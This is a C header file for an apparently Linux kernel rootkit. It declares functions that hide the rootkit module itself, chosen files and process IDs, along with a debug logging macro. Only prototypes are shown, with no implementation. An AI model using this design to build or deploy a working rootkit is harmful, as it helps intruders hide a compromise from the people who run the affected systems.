/* Interface for hiding processes, files and the rootkit itself */

#ifndef _HIDING_H
#define _HIDING_H

#include "config.h"

#define log(...) if (DEBUG) printk(__VA_ARGS__)

// Returns whether the rootkit module is hidden or not
bool is_module_hidden(void);

// Returns whether a filename is hidden or not
bool is_file_hidden(const char* name);

// Returns whether a PID is hidden or not
bool is_pid_hidden(int pid);

// Returns the hidden PID referenced in a pathname as the basename or as a
// folder, or -1 is there isn't any.
int pid_in_pathname(const char __user* pathname);


// Hides the module.
int hide_module(void);

// Unhides the module.
int unhide_module(void);

// Hides a file
int hide_file(const char* name);

// Unhides a file
int unhide_file(const char* name);

// Hides a PID
int hide_pid(int pid);

// Unhides a PID
int unhide_pid(int pid);

// Frees the list of hidden files and the list of hidden PIDs
void delete_lists(void);

// Logs every hidden file and PID
void print_hidden(void);
#endif
